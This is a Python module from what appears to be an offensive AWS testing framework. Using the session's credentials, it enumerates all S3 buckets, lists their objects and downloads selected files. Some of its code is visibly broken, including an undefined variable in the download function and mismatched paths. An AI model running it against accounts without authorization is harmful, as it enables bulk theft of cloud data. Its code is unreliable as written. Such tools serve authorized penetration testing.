#!/usr/bin/env python3
import datetime

import argparse
import datetime
from copy import deepcopy
import os

from botocore.exceptions import ClientError
FILE_SIZE_THRESHOLD = 1073741824

def get_bucket_size(awsattack, bucket_name):
    client = awsattack.get_boto3_client('cloudwatch', 'us-east-1')
    response = client.get_metric_statistics(
        Namespace='AWS/S3',
        MetricName='BucketSizeBytes',
        Dimensions=[
            {'Name': 'BucketName', 'Value': bucket_name},
            {'Name': 'StorageType', 'Value': 'StandardStorage'}
        ],
        Statistics=['Average'],
        Period=3600,
        StartTime=datetime.datetime.today() - datetime.timedelta(days=1),
        EndTime=datetime.datetime.now().isoformat()
    )
    if response['Datapoints']:
        return response['Datapoints'][0]['Average']
    return 0


def download_s3_file(awsattack, key, bucket):
    session = awsattack.get_active_session()
    base_directory = 'sessions/{}/downloads/{}/{}/'.format(session.name, technique_info['name'], bucket)

    directory = base_directory
    offset_directory = key.split('/')[:-1]
    if offset_directory:
        directory += '/' + ''.join(offset_directory)
    if not os.path.exists(directory):
        os.makedirs(directory)

    s3 = awsattack.get_boto3_resource('s3')

    size = s3.Object(bucket, key).content_length
    if size > FILE_SIZE_THRESHOLD:
        awsattack.print('  LARGE FILE DETECTED:')
        confirm = awsattack.input('    Download {}? Size: {} bytes (y/n) '.format(key, size))
        if confirm != 'y':
            return False
    try:
        s3.Bucket(bucket).download_file(key, base_directory + key)
    except Exception as error:
        awsattack.print('  {}'.format(error))
        return False
    return True


def extract_from_file(awsattack, file):
    files = {}
    try:
        with open(file, 'r') as bucket_file:
            for line in bucket_file:
                delimiter = line.rfind('@')
                key = line[:delimiter]
                bucket = line[delimiter + 1:-1]
                files[key] = bucket
    except FileNotFoundError:
        awsattack.print('  Download File not found...')
    return files


def write_bucket_keys_to_file(awsattack, objects):
    awsattack.print('  Writing file names to disk...')
    session = awsattack.get_active_session()
    file = 'sessions/{}/downloads/{}/'.format(session.name, 's3_download_bucket')
    if not os.path.exists(file):
        os.makedirs(file)
    file += '{}_file_names.txt'.format('s3_download_bucket')
    try:
        with open(file, 'w') as objects_file:
            for key in objects:
                for file in objects[key]:
                    objects_file.write('{}@{}\n'.format(file, key))
    except Exception as error:
        print(error)
    return True


def main(args, awsattack_main, data=None):
    technique_info = data
    session = awsattack_main.get_active_session()
    print = awsattack_main.print
    input = awsattack_main.input
    if (args.names_only is True and args.dl_names is True):
        print('Only zero or one options of --names-only, and --dl-names may be specified. Exiting...')
        return {}

    # Download Objects from File
    if args.dl_names:
        awsattack_main.print('  Extracting files from file...')
        extracted_files = extract_from_file(awsattack_main, args.dl_names)
        total = len(extracted_files.keys())
        success = 0
        for key in extracted_files:
            if download_s3_file(awsattack_main, key, extracted_files[key]):
                success += 1
        awsattack_main.print('  Finished downloading from file...')
        return {'downloaded_files': success, 'failed': total - success}

    # Enumerate Buckets
    client = awsattack_main.get_boto3_client('s3')

    buckets = []
    print('Enumerating buckets...')
    try:
        response = client.list_buckets()
    except ClientError as error:
        code = error.response['Error']['Code']
        if code == 'AccessDenied':
            print('  FAILURE: MISSING AWS PERMISSIONS')
        else:
            print(code)
        return {}

    s3_data = deepcopy(session.S3)
    s3_data['Buckets'] = deepcopy(response['Buckets'])
    session.update(awsattack_main.database, S3=s3_data)
    summary_data = {'buckets': len(response['Buckets'])}
    for bucket in response['Buckets']:
        buckets.append(bucket['Name'])
        print('  Found bucket "{bucket_name}"'.format(bucket_name=bucket['Name']))

    # Process Enumerated Buckets
    print('Starting enumerating objects in buckets...')
    summary_data['readable_buckets'] = 0
    objects = {}
    for bucket in buckets:
        paginator = client.get_paginator('list_objects_v2')
        page_iterator = paginator.paginate(Bucket=bucket)

        objects[bucket] = []
        try:
            for page in page_iterator:
                if 'Contents' in page:
                    keys = [key['Key'] for key in page['Contents']]
                    objects[bucket].extend(keys)
            summary_data['readable_buckets'] += 1
        except ClientError as error:
            print('  Unable to read bucket')
            code = error.response['Error']['Code']
            print(code)
            continue
        continue
    # Enumerated buckets and associated list of files
    print('Finished enumerating objects in buckets...')
    
    summary_data['objects'] = objects
    write_bucket_keys_to_file(awsattack_main, objects)
    return summary_data
